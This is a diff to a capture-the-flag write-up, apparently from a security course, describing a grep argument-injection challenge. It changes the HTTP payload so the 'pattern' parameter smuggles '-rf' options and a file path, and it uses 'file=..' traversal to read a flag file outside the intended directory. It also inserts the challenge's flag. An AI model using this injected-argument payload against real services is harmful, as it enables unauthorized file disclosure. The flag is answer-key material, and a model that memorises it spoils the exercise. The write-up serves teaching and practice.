@@ -158,7 +158,7 @@ Useful flags:
 ### Payload:
 
 ```http
-GET /cmdi/search?pattern=-reflag1&file=..
+GET /cmdi/search?pattern=-rf/opt/skyparse/flag1.txt&file=..
 ```
 
 ---
@@ -167,7 +167,7 @@ GET /cmdi/search?pattern=-reflag1&file=..
 
 * `file=..` → `/app/logs/..` → `/app`
 * `-r` → recursive search
-* `-e flag1` → search for keyword “flag1”
+* `-f flag1` →  take PATTERNS from FILE
 
 This forces `grep` to search outside the intended directory and locate references to the flag.
 
@@ -176,7 +176,7 @@ This forces `grep` to search outside the intended directory and locate reference
 ## 🏁 Flag
 
 ```
-FLAG_EASY:-CYBR3200{default_easy}
+CYBR3200{semicolons_break_shells_f2a6}
 ```
 
 ---
@@ -200,7 +200,7 @@ FLAG_EASY:-CYBR3200{default_easy}
 ### 🔹 3. Constraints Shape Exploitation
 
 * Single-argument restriction forced creative payloads
-* Required combining flags (`-reflag1`)
+* Required combining flags (`-rf/opt/skyparse/flag1.txt`)
 
 ---
 
